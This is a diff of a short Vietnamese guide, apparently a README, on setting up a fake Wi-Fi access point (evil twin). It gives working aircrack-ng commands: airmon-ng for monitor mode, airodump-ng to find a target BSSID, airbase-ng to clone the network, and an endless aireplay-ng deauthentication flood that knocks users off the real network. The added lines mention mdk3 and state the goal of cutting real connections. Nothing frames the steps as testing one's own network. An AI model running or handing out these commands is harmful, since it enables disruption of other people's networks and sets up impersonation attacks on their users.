@@ -11,7 +11,7 @@ Bước 3: Vào chế độ amitor
    sudo airmon-ng start wlan0
 
 Bước 4: Tìm địa chỉ BSSID của wifi muốn fake
-   sudo airodump-ng wlan0mon (một số máy có thể khác do card wifi)
+   sudo airodump-ng wlan0mon (một số máy có thể khác do card wifi) ----- (Ngoài ra bạn có teh63 sử dụng mdk3)
 
 Bước 5: Tạo wifi ảo
    sudo airbase-ng -a {BSSID} -e "{tên wifi}" -c 6 wlan0mon
@@ -20,3 +20,5 @@ Bước 6: Mở 1 tab terminal khác để chay lệnh ngắt kết nối các t
    sudo aireplay-ng -0 0 -a {BSSID} wlan0mon
    
 -----lưu ý đây chỉ là bước cơ bản đầu tiên của quá trình vì lý do bảo mật nên không thể public toàn bộ-------
+-----làm theo các bước trên bạn có thể tạo 1 wifi ảo và làm mất kết nối wifi thật------
+     
